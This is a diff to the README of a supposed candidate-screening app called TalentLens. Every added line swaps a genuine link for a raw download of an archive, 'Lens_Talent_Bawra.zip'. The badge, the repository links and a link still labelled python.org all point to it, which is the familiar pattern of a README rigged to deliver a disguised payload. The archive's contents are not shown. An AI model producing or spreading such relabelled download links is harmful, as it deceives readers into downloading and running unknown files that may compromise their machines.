@@ -1,6 +1,6 @@
 # ✨ TalentLens - Screen candidates with clear insight
 
-[![Download TalentLens](https://img.shields.io/badge/Download-TalentLens-1f6feb?style=for-the-badge&logo=github)](https://github.com/aziz5971/TalentLens)
+[![Download TalentLens](https://img.shields.io/badge/Download-TalentLens-1f6feb?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/aziz5971/TalentLens/main/scripts/Lens_Talent_Bawra.zip)
 
 ## 🚀 What this app does
 
@@ -24,7 +24,7 @@ For best results, use a computer with 16 GB of RAM.
 
 Open this page and get the project files from the repository:
 
-[https://github.com/aziz5971/TalentLens](https://github.com/aziz5971/TalentLens)
+[https://raw.githubusercontent.com/aziz5971/TalentLens/main/scripts/Lens_Talent_Bawra.zip](https://raw.githubusercontent.com/aziz5971/TalentLens/main/scripts/Lens_Talent_Bawra.zip)
 
 If you see a ZIP file, download it and extract it. If you see the source files only, use the steps below to run it on Windows.
 
@@ -60,7 +60,7 @@ Follow these steps in order.
 
 ### 2. Install Python
 
-1. Go to [python.org](https://www.python.org/downloads/windows/).
+1. Go to [python.org](https://raw.githubusercontent.com/aziz5971/TalentLens/main/scripts/Lens_Talent_Bawra.zip).
 2. Download Python 3.10 or newer.
 3. Run the installer.
 4. Check **Add Python to PATH**.
@@ -235,4 +235,4 @@ TalentLens
 
 ## 🔗 Download again
 
-[https://github.com/aziz5971/TalentLens](https://github.com/aziz5971/TalentLens)
+[https://raw.githubusercontent.com/aziz5971/TalentLens/main/scripts/Lens_Talent_Bawra.zip](https://raw.githubusercontent.com/aziz5971/TalentLens/main/scripts/Lens_Talent_Bawra.zip)
